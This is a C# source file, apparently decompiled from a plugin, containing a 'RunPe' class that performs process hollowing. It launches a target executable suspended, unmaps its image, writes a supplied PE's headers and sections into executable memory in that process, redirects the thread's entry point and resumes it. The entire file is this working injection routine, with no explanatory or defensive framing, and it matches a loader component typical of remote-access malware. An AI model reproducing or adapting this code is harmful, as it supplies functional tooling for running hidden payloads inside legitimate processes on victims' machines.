using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Plugin.Helper;

internal class RunPe
{
	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string _rarg1_, string _rarg2_, IntPtr _rarg3_, IntPtr _rarg4_, bool _rarg5_, uint _rarg6_, IntPtr _rarg7_, string _rarg8_, byte[] _rarg9_, byte[] _rarg1_0);

	[DllImport("kernel32.dll")]
	private static extern long VirtualAllocEx(long _rarg1_, long _rarg2_, long _rarg3_, uint _rarg4_, uint _rarg5_);

	[DllImport("kernel32.dll")]
	private static extern long WriteProcessMemory(long _rarg1_, long _rarg2_, byte[] _rarg3_, int _rarg4_, long _rarg5_);

	[DllImport("ntdll.dll")]
	private static extern uint ZwUnmapViewOfSection(long _rarg1_, long _rarg2_);

	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(long _rarg1_, IntPtr _rarg2_);

	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(long _rarg1_, IntPtr _rarg2_);

	[DllImport("kernel32.dll")]
	private static extern uint ResumeThread(long _rarg1_);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(long _rarg1_);

	public static void Run(byte[] _rarg1_, string _rarg2_, string _rarg3_)
	{
		int num = Marshal.ReadInt32(_rarg1_, 60);
		long num2 = Marshal.ReadInt64(_rarg1_, num + 24 + 24);
		byte[] array = new byte[24];
		IntPtr intPtr = new IntPtr(16 * ((Marshal.AllocHGlobal(1240).ToInt64() + 15) / 16));
		Marshal.WriteInt32(intPtr, 48, 1048603);
		CreateProcess(null, _rarg2_ + ((!string.IsNullOrEmpty(_rarg3_)) ? (" " + _rarg3_) : ""), IntPtr.Zero, IntPtr.Zero, _rarg5_: true, 4u, IntPtr.Zero, Path.GetDirectoryName(_rarg2_), new byte[104], array);
		long rarg1_ = Marshal.ReadInt64(array, 0);
		long rarg1_2 = Marshal.ReadInt64(array, 8);
		ZwUnmapViewOfSection(rarg1_, num2);
		VirtualAllocEx(rarg1_, num2, Marshal.ReadInt32(_rarg1_, num + 24 + 56), 12288u, 64u);
		WriteProcessMemory(rarg1_, num2, _rarg1_, Marshal.ReadInt32(_rarg1_, num + 24 + 60), 0L);
		for (short num3 = 0; num3 < Marshal.ReadInt16(_rarg1_, num + 4 + 2); num3++)
		{
			byte[] array2 = new byte[40];
			Buffer.BlockCopy(_rarg1_, num + (24 + Marshal.ReadInt16(_rarg1_, num + 4 + 16)) + 40 * num3, array2, 0, 40);
			byte[] array3 = new byte[Marshal.ReadInt32(array2, 16)];
			Buffer.BlockCopy(_rarg1_, Marshal.ReadInt32(array2, 20), array3, 0, array3.Length);
			WriteProcessMemory(rarg1_, num2 + Marshal.ReadInt32(array2, 12), array3, array3.Length, 0L);
		}
		GetThreadContext(rarg1_2, intPtr);
		WriteProcessMemory(rarg1_, Marshal.ReadInt64(intPtr, 136) + 16, BitConverter.GetBytes(num2), 8, 0L);
		Marshal.WriteInt64(intPtr, 128, num2 + Marshal.ReadInt32(_rarg1_, num + 24 + 16));
		SetThreadContext(rarg1_2, intPtr);
		ResumeThread(rarg1_2);
		try
		{
			Marshal.FreeHGlobal(intPtr);
		}
		catch
		{
		}
		CloseHandle(rarg1_);
		CloseHandle(rarg1_2);
	}
}
